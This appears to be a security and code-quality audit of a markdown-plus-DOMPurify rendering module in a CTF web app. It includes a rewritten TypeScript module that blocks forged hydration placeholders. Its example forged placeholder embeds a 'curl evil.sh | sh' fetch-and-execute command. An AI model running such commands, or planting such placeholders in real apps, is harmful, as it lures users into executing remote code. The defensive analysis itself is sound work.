# Audit: marked v17 + DOMPurify pipeline (`markdown.ts`)

All claims verified against installed packages (marked 17.0.4, dompurify 3.4.3 in `/Users/enscribe/Repositories/jktrn/rctf-new/apps/web-new/node_modules/`) and current official docs. Every "empirically confirmed" item was executed against the exact installed builds in a throwaway harness (marked ESM directly; DOMPurify under happy-dom).

## Findings

- [BUG] `apps/web-new/src/lib/utils/markdown.ts:120-126` — the docs contract ("hand-written [data-alert/data-timer] must have no effect", `docs/research/07-product-requirements.md:40`) is violated: a user writing raw `<div data-alert data-type="connection" data-content="curl evil | sh"></div>` in challenge markdown passes through marked as an HTML block, survives DOMPurify, and is hydrated into a live component (including the connection copy button) by `markdown.svelte:37`.
  - evidence: DOMPurify README — `ALLOW_DATA_ATTR` default is **true** ("prohibit HTML5 data attributes … (default is true)"; "DOMPurify per default allows CSS, HTML custom data attributes", https://raw.githubusercontent.com/cure53/DOMPurify/main/README.md). Empirically confirmed: `DOMPurify.sanitize('<div data-alert data-type="connection" data-content="curl evil.sh | sh"></div>')` returns the input unchanged under BOTH the `ADD_ATTR` config and the bare-default config used by `parseAlertContent` (so forged placeholders nested inside alert bodies survive too). marked passthrough confirmed: `marked.parse('<div data-alert …></div>')` emits it verbatim.
  - fix: config alone cannot fix this — `ALLOW_DATA_ATTR: false` strips the extension's own placeholders, and `ADD_ATTR` re-allows forged ones (both confirmed empirically). The extensions must emit a per-session `crypto.randomUUID()` nonce that hand-written markdown cannot know, and a DOMPurify `afterSanitizeAttributes` hook must strip the four hydration attributes from any node lacking it (and strip `data-nonce` itself from output). See rewrite spec below; behavior verified: forged nodes lose all hydration attrs, legit placeholders survive with clean output.

- [BUG] `apps/web-new/src/lib/utils/markdown.ts:111-115` — `ensureHtmlBlockSeparation` runs a blind regex over the raw source and inserts blank lines _inside fenced code blocks_, corrupting rendered code.
  - evidence: empirically confirmed: input ` `html\n<div>\n</div>\n<span>hi</span>\n` ` renders a `<pre>` whose content gained a spurious blank line between `</div>` and `<span>hi</span>`. (Same bug exists in `apps/web/src/lib/utils/markdown.ts:89-93` — this is the moment to fix it, not preserve it.)
  - fix: make the transform fence-aware (transform only the segments between fences) and move it into the documented `hooks.preprocess` — see rewrite. Fix verified: fenced content now byte-identical through the pipeline.

- [API-MISUSE] `apps/web-new/src/lib/utils/markdown.ts:124` — `ADD_ATTR: ['data-alert', 'data-type', 'data-content', 'data-timer']` is a complete no-op that documents a false belief (that data-\* attrs need allowlisting).
  - evidence: DOMPurify README, `ALLOW_DATA_ATTR` default true (citation above); empirically confirmed identical output with and without `ADD_ATTR`.
  - fix: delete it (superseded by the nonce hook above).

- [ANTI-PATTERN] `apps/web-new/src/lib/utils/markdown.ts:105-107` — `marked.use(...)` mutates the shared global singleton at module scope.
  - evidence: https://marked.js.org/using_advanced — "changing the options in one script will also change the options in another script since they share the same instance"; docs recommend `import { Marked } from 'marked'; const marked = new Marked(...)` when "you don't want to mutate global scope" so "options and extensions are locally scoped". `Marked` class confirmed in installed `node_modules/marked/lib/marked.d.ts:628`.
  - fix: `const marked = new Marked({ extensions, hooks })`. Same principle applies to DOMPurify hooks: use an isolated instance `DOMPurify(window)` (call signature confirmed at `node_modules/dompurify/dist/purify.es.d.mts:221`) so the attribute hook can't leak to future dompurify consumers (currently `markdown.ts` is the only one).

- [SIMPLIFICATION] `apps/web-new/src/lib/utils/markdown.ts:111-126` — the pre-parse regex and the post-parse sanitize are ad-hoc wrappers around `marked.parse`; marked has first-class hooks for exactly these two stages, and folding sanitization into `hooks.postprocess` guarantees no caller can ever obtain unsanitized output.
  - evidence: https://marked.js.org/using_pro — `preprocess(markdown: string): string` "Process markdown before sending it to marked", `postprocess(html: string): string` "Process html after marked has finished parsing"; installed `marked.d.ts:387-391, 461-463`.
  - fix: `hooks: { preprocess: separateHtmlBlocks, postprocess: html => purify.sanitize(html) }`; exports become one-liners.

- [STYLE] `apps/web-new/src/lib/utils/markdown.ts:118,122` — `marked.parse(content) as string` casts around a union return type that marked already narrows via overload.
  - evidence: installed `marked.d.ts:628-640` — `Marked.parse(src, options & { async: false }): ParserOutput` (string).
  - fix: `marked.parse(content, { async: false })` — no cast.

- [STYLE] `apps/web-new/src/lib/utils/markdown.ts:41` — `start: src => src.match(/^> \[!/)?.index` is anchored without `/m`, so it can only ever return `0` or `undefined`, contradicting the documented purpose of `start`.
  - evidence: https://marked.js.org/using_pro — `start` "Returns the index of the next potential token start". Harmless today only because a `>` line already interrupts paragraphs in CommonMark (verified: alert directly after a paragraph tokenizes correctly), but the code lies about what it does.
  - fix: add the `m` flag: `src.match(/^> \[!/m)?.index`.

- [SIMPLIFICATION] `apps/web-new/src/lib/utils/markdown.ts:4-10,27-36,44` — the six alert types are spelled out three times in this file (union type, `isAlertType` array, regex alternation) and a fourth time in `markdown.svelte:20-27` (`getAlertType`).
  - evidence: self-evident duplication; the tokenizer can match `\[!(\w+)\]` and delegate validation to one `ALERT_TYPES as const` (unknown-type blockquote fallback verified identical under this form).
  - fix: `export const ALERT_TYPES = [...] as const; export type AlertType = (typeof ALERT_TYPES)[number]; export const isAlertType = ...` and have `markdown.svelte` import `isAlertType` instead of re-listing.

- [SIMPLIFICATION] `apps/web-new/src/lib/utils/markdown.ts:69-103` — the timer inline+block twins: **the twin is the correct marked-idiomatic mechanism and should stay.** Extensions are single-level (`level: 'block' | 'inline'`, using_pro), and a standalone `<timer />` line is a CommonMark HTML block that inline extensions never see (verified: without the block twin, the tag reaches DOMPurify and is stripped — `sanitize('<timer />')` → `""`). A `preprocess` normalization was evaluated and rejected: preprocess sees raw text, so it would also rewrite `` `<timer />` `` inside code spans/fences (a regression — the inline extension currently loses to the codespan tokenizer correctly). The only real defect is the duplicated tag regex.
  - fix: derive both patterns from one `TIMER_TAG` source string and share the placeholder literal — see rewrite.

- [STYLE] `apps/web-new/src/lib/utils/markdown.ts:19-25` — `escapeHtml` verdict (Q4): **hand-rolling is necessary and correct.** marked v17 exports no public string-escape helper (checked entire installed `marked.d.ts`: `escape` appears only as a Tokenizer method returning a token and as regex fields), and a custom renderer emits raw HTML, so attribute-context escaping is the extension author's job. The `getAttribute` roundtrip (browser decodes entities) was verified: `"quotes" & <tags>` survives encode→sanitize→decode→re-parse intact. Rename to `escapeAttribute` and scope the comment to the double-quoted-attribute context; the `'` replacement is dead weight (payload is always double-quoted) but harmless.

- [STYLE] `apps/web-new/docs/research/07-product-requirements.md:39` — the behavior contract itself is wrong about marked defaults: "No GFM plugin: no task lists, footnotes, or strikethrough" — marked's default is `gfm: true`, which includes strikethrough and task lists in core.
  - evidence: https://marked.js.org/using_advanced (gfm default `true`); empirically confirmed on installed 17.0.4: `~~gone~~` → `<p><del>gone</del></p>`, `- [ ] todo` → checkbox `<li>`. The old app uses the same defaults, so both apps render these; only footnotes are truly absent (they need `marked-footnote`). The doc should be corrected by whoever owns it — the code needs no change.

- Two adjacent flags (other dimensions own the fixes): (1) `apps/web-new/src/routes/+page.svelte:30` renders `sponsor.description` via bare `{@html parseMarkdown(...)}` with no hydration pass, so any alert/timer in a sponsor description becomes a silent empty `<div>` — it should use the `Markdown` component. (2) `markdown.svelte:43` computes `parseAlertContent` for connection alerts whose body is by contract never markdown-parsed — wasted parse per hydration.

- Correct-per-docs (explicitly): the extension object shape (`name`/`level`/`start`/`tokenizer`/`renderer`, `raw` consumption, `undefined` fallback to default tokenizers) matches using_pro exactly; `TokenizerAndRendererExtension` is the documented type; the case-insensitive `[!type]` trigger, unknown-type blockquote fallback, and CONNECTION semantics all match the contract (verified by execution); "DOMPurify default profile" is the right sanitizer baseline per the contract, and `<details>/<summary>/<kbd>` survive it as required. Also worth a code comment, not a change: DOMPurify silently returns input **unsanitized** when `!DOMPurify.isSupported` (`node_modules/dompurify/dist/purify.es.mjs:1372-1374`) — safe here only because the app pins `ssr = false` (`src/routes/+layout.ts:6`).

## Elegant-rewrite spec — `apps/web-new/src/lib/utils/markdown.ts` (validated end-to-end against installed packages)

````ts
import DOMPurify from 'dompurify'
import { Marked, type TokenizerAndRendererExtension } from 'marked'

export const ALERT_TYPES = [
  'note',
  'tip',
  'important',
  'warning',
  'caution',
  'connection',
] as const

export type AlertType = (typeof ALERT_TYPES)[number]

export const isAlertType = (value: string): value is AlertType =>
  (ALERT_TYPES as readonly string[]).includes(value)

interface AlertToken {
  type: 'alert'
  raw: string
  alertType: AlertType
  content: string
}

// hydration placeholders carry a per-session secret so hand-written data-alert/
// data-timer attributes in user markdown are stripped by the sanitizer hook below —
// only extension-emitted placeholders may hydrate (product requirement 07 §2)
const nonce = crypto.randomUUID()
const HYDRATION_ATTRS = [
  'data-alert',
  'data-type',
  'data-content',
  'data-timer',
]

// escaping for a double-quoted attribute value (the data-content payload)
const escapeAttribute = (text: string) =>
  text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')

const alert: TokenizerAndRendererExtension = {
  name: 'alert',
  level: 'block',
  start: src => src.match(/^> \[!/m)?.index,
  tokenizer(src): AlertToken | undefined {
    const match = /^> \[!(\w+)\]\n((?:> .*(?:\n|$))+)/i.exec(src)
    if (!match?.[1] || !match[2]) return undefined
    const alertType = match[1].toLowerCase()
    if (!isAlertType(alertType)) return undefined
    return {
      type: 'alert',
      raw: match[0],
      alertType,
      content: match[2]
        .split('\n')
        .map(line => line.replace(/^> ?/, ''))
        .join('\n')
        .trim(),
    }
  },
  renderer(token) {
    const { alertType, content } = token
    return (
      `<div data-alert data-nonce="${nonce}" data-type="${alertType}"` +
      ` data-content="${escapeAttribute(content)}"></div>`
    )
  },
}

const TIMER_TAG = String.raw`<timer\s*/?>(?:</timer>)?`
const TIMER_INLINE = new RegExp(`^${TIMER_TAG}`, 'i')
const TIMER_BLOCK = new RegExp(String.raw`^${TIMER_TAG}[ \t]*(?:\n+|$)`, 'i')
const timerPlaceholder = `<span data-timer data-nonce="${nonce}"></span>`

const timerInline: TokenizerAndRendererExtension = {
  name: 'timer',
  level: 'inline',
  start: src => src.match(/<timer/i)?.index,
  tokenizer(src) {
    const match = TIMER_INLINE.exec(src)
    return match ? { type: 'timer', raw: match[0] } : undefined
  },
  renderer: () => timerPlaceholder,
}

// a standalone <timer /> line is a CommonMark html *block*, which inline extensions
// never see, and marked extensions are single-level — hence this block twin
const timerBlock: TokenizerAndRendererExtension = {
  name: 'timerBlock',
  level: 'block',
  start: src => src.match(/^<timer/im)?.index,
  tokenizer(src) {
    const match = TIMER_BLOCK.exec(src)
    return match ? { type: 'timerBlock', raw: match[0] } : undefined
  },
  renderer: () => `<p>${timerPlaceholder}</p>`,
}

// marked treats lines directly after closing block-level html as part of the html
// block; force a blank line so following markdown still gets parsed. fenced code is
// passed through untouched so the inserted blank line cannot corrupt code content
const FENCED_CODE =
  /(^|\n)(?:```|~~~)[^\n]*\n[\s\S]*?\n(?:```|~~~)[ \t]*(?=\n|$)/g
const BLOCK_HTML_BOUNDARY =
  /(<\/(?:div|p|blockquote|pre|table|dl|ol|ul|fieldset|details|dialog|figure|figcaption|footer|form|header|hr|main|nav|search|section|h[1-6])>|<(?:hr|br|img|input|source|track|wbr)\b[^>]*\/?>)\n(?!\n)/gi

const separateHtmlBlocks = (markdown: string): string => {
  const parts: string[] = []
  let last = 0
  for (const match of markdown.matchAll(FENCED_CODE)) {
    parts.push(
      markdown.slice(last, match.index).replace(BLOCK_HTML_BOUNDARY, '$1\n\n'),
      match[0]
    )
    last = match.index + match[0].length
  }
  parts.push(markdown.slice(last).replace(BLOCK_HTML_BOUNDARY, '$1\n\n'))
  return parts.join('')
}

// module-local instance: the hook below must not leak to other dompurify consumers.
// note: DOMPurify returns input UNSANITIZED where no DOM exists (isSupported=false);
// safe here because the app is csr-only (src/routes/+layout.ts: ssr = false)
const purify = DOMPurify(window)

purify.addHook('afterSanitizeAttributes', node => {
  const emittedByExtension = node.getAttribute('data-nonce') === nonce
  node.removeAttribute('data-nonce')
  if (emittedByExtension) return
  for (const name of HYDRATION_ATTRS) node.removeAttribute(name)
})

const marked = new Marked({
  extensions: [alert, timerInline, timerBlock],
  hooks: {
    preprocess: separateHtmlBlocks,
    postprocess: html => purify.sanitize(html),
  },
})

export const parseMarkdown = (content: string): string =>
  marked.parse(content, { async: false })

// alert bodies go through the identical pipeline (nested alerts/timers included)
export const parseAlertContent = parseMarkdown
````

Companion change in `markdown.svelte`: replace `getAlertType`'s six-branch re-validation with `import { isAlertType } from '$lib/utils/markdown'` (`const type = el.getAttribute('data-type') ?? ''; return isAlertType(type) ? type : 'note'`). No other component changes required — hydration selectors (`[data-alert]`, `[data-timer]`) and the `data-content` payload contract are unchanged, and `data-nonce` never reaches the DOM.

Validation performed against installed marked 17.0.4 + dompurify 3.4.3: all six alert types (incl. lowercase trigger), unknown type → blockquote fallback, connection payload, attribute-escaping roundtrip through `getAttribute`, inline + standalone + paired `<timer>`, forged `data-alert`/`data-timer`/guessed-nonce inputs fully neutralized (both in `parseMarkdown` and nested inside `parseAlertContent` payloads), html-block separation still working, fenced code no longer corrupted, `onerror` XSS stripped, `<details>/<kbd>` preserved.

VERDICT: The extension mechanics are genuinely correct per current marked v17 docs — token shapes, levels, fallback behavior, and the block-twin insight are all right, and the timer twin should survive the rewrite. The file's real problems are structural and one is a contract violation: DOMPurify's `ALLOW_DATA_ATTR: true` default means the `ADD_ATTR` config is a no-op and hand-written hydration placeholders in user markdown hydrate into live components, directly violating the documented requirement; and the html-block-separation regex corrupts fenced code (inherited from apps/web). Highest-leverage changes, in order: (1) the nonce + `afterSanitizeAttributes` hook to enforce "only extension-emitted placeholders hydrate"; (2) `new Marked` instance with `preprocess`/`postprocess` hooks so sanitization is inseparable from parsing and nothing global is mutated; (3) the fence-aware preprocess fixing code-block corruption. The requirements doc's GFM claim (line 39 of 07-product-requirements.md) is factually wrong about marked defaults and should be corrected separately.
